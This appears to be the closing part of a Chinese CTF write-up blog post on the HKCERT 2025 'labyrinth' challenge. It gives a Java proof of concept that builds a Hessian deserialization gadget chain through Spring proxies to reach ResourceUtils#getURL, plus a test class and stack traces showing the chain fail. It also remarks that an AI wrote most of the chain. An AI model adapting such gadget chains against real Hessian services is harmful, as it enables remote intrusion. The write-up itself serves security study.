+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example.b;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">import cn.org.unk.Gadget;</span><br><span class="line">import cn.org.unk.Util;</span><br><span class="line">import org.springframework.util.ResourceUtils;</span><br><span class="line">import org.springframework.util.SerializationUtils;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.annotation.MvcUriComponentsBuilder;</span><br><span class="line">import com.alibaba.com.caucho.hessian.io.Hessian2Output;</span><br><span class="line">import com.alibaba.com.caucho.hessian.io.SerializerFactory;</span><br><span class="line">import org.example.labyrinth.model.CustomProxy;</span><br><span class="line"></span><br><span class="line">import javax.annotation.Resource;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">Caused by: java.lang.UnsupportedOperationException: ObjectDeserializer[interface org.springframework.core.SerializableTypeWrapper$TypeProvider]</span><br><span class="line">	at com.alibaba.com.caucho.hessian.io.ObjectDeserializer.readObject(ObjectDeserializer.java:76)</span><br><span class="line">	at com.alibaba.com.caucho.hessian.io.AbstractDeserializer.readObject(AbstractDeserializer.java:127)</span><br><span class="line">	at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObjectInstance(Hessian2Input.java:2956)</span><br><span class="line">	at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2289)</span><br><span class="line">	at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2218)</span><br><span class="line">	at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2262)</span><br><span class="line">	at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2218)</span><br><span class="line">	at com.alibaba.com.caucho.hessian.io.FieldDeserializer2FactoryUnsafe$ObjectFieldDeserializer.deserialize(FieldDeserializer2FactoryUnsafe.java:213)</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">public class Poc &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Generating payload...&quot;);</span><br><span class="line"></span><br><span class="line">        // 2. Create TypeProvider proxy that returns typeProxy</span><br><span class="line">        Class&lt;?&gt; typeProviderClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;);</span><br><span class="line">        Constructor&lt;?&gt; aihCtor = Class.forName(&quot;com.alibaba.com.caucho.hessian.io.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, HashMap.class);</span><br><span class="line">        aihCtor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;getType&quot;, ResourceUtils.class);</span><br><span class="line">        </span><br><span class="line">        InvocationHandler annotationInvocationHandler = (InvocationHandler) aihCtor.newInstance(typeProviderClass, map);</span><br><span class="line">        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;typeProviderClass&#125;, annotationInvocationHandler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 4. Create TypeProxyInvocationHandler</span><br><span class="line">        Class&lt;?&gt; typeProxyInvocationHandlerClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProxyInvocationHandler&quot;);</span><br><span class="line">        Constructor&lt;?&gt; tpihCtor = typeProxyInvocationHandlerClass.getDeclaredConstructor(typeProviderClass);</span><br><span class="line">        tpihCtor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        InvocationHandler finalHandler = (InvocationHandler) tpihCtor.newInstance(typeProviderProxy);</span><br><span class="line"></span><br><span class="line">        // 5. Wrap in CustomProxy to trigger</span><br><span class="line">        Method compareToMethod = ResourceUtils.class.getMethod(&quot;getURL&quot;, String.class);</span><br><span class="line"></span><br><span class="line">        Util.setFieldValue(compareToMethod, &quot;name&quot;, &quot;compareTo&quot;);</span><br><span class="line"></span><br><span class="line">        CustomProxy customProxy = new CustomProxy(finalHandler, compareToMethod);</span><br><span class="line">        </span><br><span class="line">        // 6. Put in TreeMap</span><br><span class="line">        TreeMap&lt;Object, Object&gt; treeMap = new TreeMap&lt;&gt;();</span><br><span class="line">        treeMap.put(&quot;http://127.0.0.1:8989&quot;, &quot;foo&quot;);</span><br><span class="line"></span><br><span class="line">        treeMap.put(&quot;customProxy&quot;, &quot;foo&quot;);</span><br><span class="line">        //treeMap.put(customProxy, &quot;foo&quot;); // 直接正向触发 compare</span><br><span class="line"></span><br><span class="line">        //System.exit(-1);</span><br><span class="line"></span><br><span class="line">        replaceKey(Util.getFieldValue(treeMap, &quot;root&quot;), &quot;customProxy&quot;, customProxy);</span><br><span class="line"></span><br><span class="line">        // Serialize</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        Hessian2Output out = new Hessian2Output(baos);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">        out.writeObject(treeMap);</span><br><span class="line">        out.flush();</span><br><span class="line">        byte[] payload = baos.toByteArray();</span><br><span class="line">        </span><br><span class="line">        // Save to file</span><br><span class="line">        File file = new File(&quot;payload.bin&quot;);</span><br><span class="line">        FileOutputStream fos = new FileOutputStream(file);</span><br><span class="line">        fos.write(payload);</span><br><span class="line">        fos.close();</span><br><span class="line">        </span><br><span class="line">        System.out.println(&quot;Payload generated to &quot; + file.getAbsolutePath());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public static void replaceKey(Object entry, Object targetKey, Object newKey) throws Exception &#123;</span><br><span class="line">        if (entry == null) return;</span><br><span class="line">        </span><br><span class="line">        Field keyField = entry.getClass().getDeclaredField(&quot;key&quot;);</span><br><span class="line">        keyField.setAccessible(true);</span><br><span class="line">        Object key = keyField.get(entry);</span><br><span class="line">        </span><br><span class="line">        if (key != null &amp;&amp; key.equals(targetKey)) &#123;</span><br><span class="line">            keyField.set(entry, newKey);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        Field leftField = entry.getClass().getDeclaredField(&quot;left&quot;);</span><br><span class="line">        leftField.setAccessible(true);</span><br><span class="line">        replaceKey(leftField.get(entry), targetKey, newKey);</span><br><span class="line">        </span><br><span class="line">        Field rightField = entry.getClass().getDeclaredField(&quot;right&quot;);</span><br><span class="line">        rightField.setAccessible(true);</span><br><span class="line">        replaceKey(rightField.get(entry), targetKey, newKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>正向触发时的调用栈，是可以的。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hkcert2025-labyrinth/image-20251221225821547.png" alt="image-20251221225821547.png"></p>
+<p>有个关键点：</p>
+<p>CustomProxy 的 m3 这个Method，是可以通过反射修改 name 绕过的，调用的实际上还是 getURL。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hkcert2025-labyrinth/image-20251221225916325.png" alt="image-20251221225916325.png"></p>
+<p>可以成功调用到  <code>ResourceUtils#getURL</code>，且参数也是可控的。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hkcert2025-labyrinth/image-20251221230041049.png" alt="image-20251221230041049.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hkcert2025-labyrinth/image-20251221230101289.png" alt="image-20251221230101289.png"></p>
+<p>然后我来试试反序列化能不能正常触发，结果遇到问题了，报错栈如下：</p>
+<blockquote>
+<p>十二月 21, 2025 11:03:23 下午 com.alibaba.com.caucho.hessian.io.SerializerFactory getDeserializer<br>警告: Hessian&#x2F;Burlap: ‘org.springframework.core.$Proxy0’ is an unknown class in sun.misc.Launcher$AppClassLoader@18b4aac2:<br>java.lang.ClassNotFoundException: org.springframework.core.$Proxy0<br>com.alibaba.com.caucho.hessian.io.HessianFieldException: org.springframework.core.SerializableTypeWrapper$TypeProxyInvocationHandler.provider: org.springframework.core.SerializableTypeWrapper$TypeProvider cannot be assigned from null<br>at com.alibaba.com.caucho.hessian.io.FieldDeserializer2FactoryUnsafe.logDeserializeError(FieldDeserializer2FactoryUnsafe.java:120)<br>at com.alibaba.com.caucho.hessian.io.FieldDeserializer2FactoryUnsafe$ObjectFieldDeserializer.deserialize(FieldDeserializer2FactoryUnsafe.java:217)<br>at com.alibaba.com.caucho.hessian.io.UnsafeDeserializer.readObject(UnsafeDeserializer.java:298)<br>at com.alibaba.com.caucho.hessian.io.UnsafeDeserializer.readObject(UnsafeDeserializer.java:203)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObjectInstance(Hessian2Input.java:2956)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2289)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2218)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2262)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2218)<br>at com.alibaba.com.caucho.hessian.io.FieldDeserializer2FactoryUnsafe$ObjectFieldDeserializer.deserialize(FieldDeserializer2FactoryUnsafe.java:213)<br>at com.alibaba.com.caucho.hessian.io.UnsafeDeserializer.readObject(UnsafeDeserializer.java:271)<br>at com.alibaba.com.caucho.hessian.io.UnsafeDeserializer.readObject(UnsafeDeserializer.java:186)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObjectInstance(Hessian2Input.java:2958)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2884)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2419)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2857)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2419)<br>at com.alibaba.com.caucho.hessian.io.MapDeserializer.doReadMap(MapDeserializer.java:143)<br>at com.alibaba.com.caucho.hessian.io.MapDeserializer.readMap(MapDeserializer.java:124)<br>at com.alibaba.com.caucho.hessian.io.MapDeserializer.readMap(MapDeserializer.java:96)<br>at com.alibaba.com.caucho.hessian.io.SerializerFactory.readMap(SerializerFactory.java:621)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2851)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2419)<br>at org.example.Hessian2Main.deserialize(Hessian2Main.java:33)<br>at org.example.b.Test.deser(Test.java:30)<br>at org.example.b.Test.main(Test.java:26)<br>Caused by: java.lang.UnsupportedOperationException: ObjectDeserializer[interface org.springframework.core.SerializableTypeWrapper$TypeProvider]<br>at com.alibaba.com.caucho.hessian.io.ObjectDeserializer.readObject(ObjectDeserializer.java:76)<br>at com.alibaba.com.caucho.hessian.io.AbstractDeserializer.readObject(AbstractDeserializer.java:127)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObjectInstance(Hessian2Input.java:2956)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2289)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2218)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2262)<br>at com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:2218)<br>at com.alibaba.com.caucho.hessian.io.FieldDeserializer2FactoryUnsafe$ObjectFieldDeserializer.deserialize(FieldDeserializer2FactoryUnsafe.java:213)<br>… 24 more</p>
+</blockquote>
+<p>看了挺久，原因估计是 hessian 和 java 原生反序列化不同，没办法反序列化一个动态代理，会用一个 hashmap 去替代。</p>
+<p>用一段简单代码测试一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example.b;</span><br><span class="line"></span><br><span class="line">import cn.org.unk.Util;</span><br><span class="line">import org.example.Hessian2Main;</span><br><span class="line">import org.example.labyrinth.model.CustomProxy;</span><br><span class="line">import org.springframework.util.ResourceUtils;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.TreeMap;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">发现问题了，序列化的时候是一个 Proxy，但是恢复的时候变成了 HashMap</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        //ser();</span><br><span class="line">        deser();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void deser()&#123;</span><br><span class="line">        Object deserialize = Hessian2Main.deserialize(&quot;payload.bin&quot;);</span><br><span class="line">        System.out.println(deserialize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void ser() throws Exception&#123;</span><br><span class="line">        // 2. Create TypeProvider proxy that returns typeProxy</span><br><span class="line">        Class&lt;?&gt; typeProviderClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;);</span><br><span class="line">        Constructor&lt;?&gt; aihCtor = Class.forName(&quot;com.alibaba.com.caucho.hessian.io.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, HashMap.class);</span><br><span class="line">        aihCtor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;getType&quot;, ResourceUtils.class);</span><br><span class="line"></span><br><span class="line">        InvocationHandler annotationInvocationHandler = (InvocationHandler) aihCtor.newInstance(typeProviderClass, map);</span><br><span class="line">        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;typeProviderClass&#125;, annotationInvocationHandler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; typeProxyInvocationHandlerClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProxyInvocationHandler&quot;);</span><br><span class="line">        Constructor&lt;?&gt; tpihCtor = typeProxyInvocationHandlerClass.getDeclaredConstructor(typeProviderClass);</span><br><span class="line">        tpihCtor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        Hessian2Main.serialize(typeProviderProxy, &quot;payload.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看到，序列化的是一个 Proxy，反序列化得到的是一个 HashMap，应该是这里造成了一连串报错。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hkcert2025-labyrinth/image-20251221230739354.png" alt="image-20251221230739354.png"></p>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>以上记录的就主要是死磕过程产生的副产物了，大部分都是 AI 给的，我只给他了一个 jadx 反编译之后的源码和 jdk 源码，他就能搓出几乎正确的链子了，要是改进一下，比如给一些分析工具比如 codqel 搓个 mcp 再接入，基本就无敌了。唉，人类一败涂地了。</p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E8%A7%A3"><span class="toc-text">正解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JdkDynamicAopProxy"><span class="toc-text">JdkDynamicAopProxy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MethodInvokeTypeProvider"><span class="toc-text">MethodInvokeTypeProvider</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ResourceUtils"><span class="toc-text">ResourceUtils</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-text">结语</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
